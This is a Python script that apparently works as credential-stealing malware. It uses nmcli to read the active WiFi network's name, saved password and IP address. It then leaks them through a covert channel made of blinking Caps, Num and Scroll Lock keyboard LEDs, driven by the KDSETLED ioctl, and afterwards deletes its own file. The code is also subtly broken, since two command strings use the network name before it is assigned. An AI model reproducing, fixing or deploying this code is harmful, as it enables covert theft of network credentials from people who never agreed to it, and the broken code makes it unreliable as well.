import fcntl
import os
import time
import sys
import subprocess

# --- Linux Kernel Constants ---
KDSETLED = 0x4B32  # Command to set LEDs
SCR_LED  = 0x01    # Scroll Lock Bit
NUM_LED  = 0x02    # Num Lock Bit
CAP_LED  = 0x04    # Caps Lock Bit

DELAY_BIT = 0.05
DELAY_CLOCK = 0.1

# Global file descriptor for console
console_fd = None

def init_console():
    global console_fd
    # Open the console device. 
    # /dev/console or /dev/tty0 usually maps to the active virtual terminal
    console_fd = os.open('/dev/console', os.O_NOCTTY)

def set_leds_ioctl(caps=False, num=False, scroll=False):
    if console_fd is None:
        return

    # Calculate the mask based on kernel constants
    mask = 0
    if scroll: mask |= SCR_LED
    if num:    mask |= NUM_LED
    if caps:   mask |= CAP_LED
    # Send the ioctl command directly to the kernel driver
    fcntl.ioctl(console_fd, KDSETLED, mask)

def blink_sync():
    print("[*] Syncing...")
    for _ in range(3):
        set_leds_ioctl(caps=True)
        time.sleep(0.2)
        set_leds_ioctl(caps=False)
        time.sleep(0.2)

def transmit_data(data):
    print(f"[*] Starting Transmission: {data}")
    blink_sync()
    
    set_leds_ioctl(caps=False, num=False, scroll=False)
    time.sleep(1)

    scroll_state = False

    for char in data:
        binary = format(ord(char), '08b')
        
        for i in range(0, 8, 2):
            bit1 = binary[i]
            bit2 = binary[i+1]
            
            set_leds_ioctl(
                caps=(bit1 == '1'), 
                num=(bit2 == '1'), 
                scroll=scroll_state
            )
            
            time.sleep(DELAY_BIT)
            
            scroll_state = not scroll_state
            
            set_leds_ioctl(
                caps=(bit1 == '1'), 
                num=(bit2 == '1'), 
                scroll=scroll_state
            )
            
            time.sleep(DELAY_CLOCK)

    set_leds_ioctl(caps=False, num=True, scroll=False)
    time.sleep(0.5)
    set_leds_ioctl(caps=False, num=False, scroll=False)
    print("[*] Done.")

def get_wifi_info():
    real_user = os.environ.get('SUDO_USER')
    cmd_prefix = ""
    if real_user:
        cmd_prefix = f"sudo -u {real_user} "
    name_cmd = "nmcli -t -f NAME connection show --active | head -n 1"
    pass_cmd = f"{cmd_prefix} nmcli -s -g 802-11-wireless-security.psk connection show '{name}'"
    ip_cmd = f"{cmd_prefix} nmcli -s -g IP4.ADDRESS connection show '{name}' | cut -d/ -f1"
    
    name = subprocess.check_output(name_cmd, shell=True).decode().strip()
    password = subprocess.check_output(pass_cmd, shell=True).decode().strip()
    ip = subprocess.check_output(ip_cmd, shell=True).decode().strip()
    
    
    return f"NAME:{name}|PASS:{password}|IP:{ip}\0"

def cleanup():
    if console_fd:
        os.close(console_fd)
    try:
        os.remove(sys.argv[0])
    except:
        pass

if __name__ == "__main__":
    init_console()
    try:
        wifi_data = get_wifi_info()
        transmit_data(wifi_data)
    finally:
        cleanup()